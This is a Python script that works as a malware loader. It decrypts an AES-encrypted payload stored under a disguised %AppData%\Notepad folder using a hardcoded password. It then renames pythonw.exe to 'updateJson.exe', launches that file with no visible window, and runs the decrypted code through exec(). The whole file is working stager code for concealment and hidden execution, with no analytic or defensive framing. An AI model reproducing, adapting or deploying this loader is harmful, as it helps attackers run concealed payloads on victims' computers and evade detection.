import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import subprocess
import os
import shutil

PASSWORD = "we3p2v5t85"
KEY = hashlib.md5(PASSWORD.encode()).digest()  

def decrypt_and_execute():
    try:
        # Get the path to %AppData%\Notepad\data.aes
        appdata_dir = os.getenv('APPDATA')
        input_file = os.path.join(appdata_dir, "Notepad", "data.aes")
        
        with open(input_file, 'rb') as f:
            data = f.read()
        
        iv = data[:16]
        ciphertext = data[16:]
        
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted_code = unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
        
        current_dir = os.path.dirname(os.path.abspath(__file__))
        pythonw_path = os.path.join(current_dir, "pythonw.exe")
        new_name_path = os.path.join(current_dir, "updateJson.exe")
        
        if os.path.exists(pythonw_path):
            if os.path.exists(new_name_path):
                os.remove(new_name_path)
            shutil.copy2(pythonw_path, new_name_path)
            os.remove(pythonw_path)
            
            subprocess.Popen([new_name_path], creationflags=subprocess.CREATE_NO_WINDOW)
        
        exec(decrypted_code)
        
        return True
    
    except Exception as e:
        print(f"[!] Failed: {e}")
        return False

if __name__ == "__main__":
    decrypt_and_execute()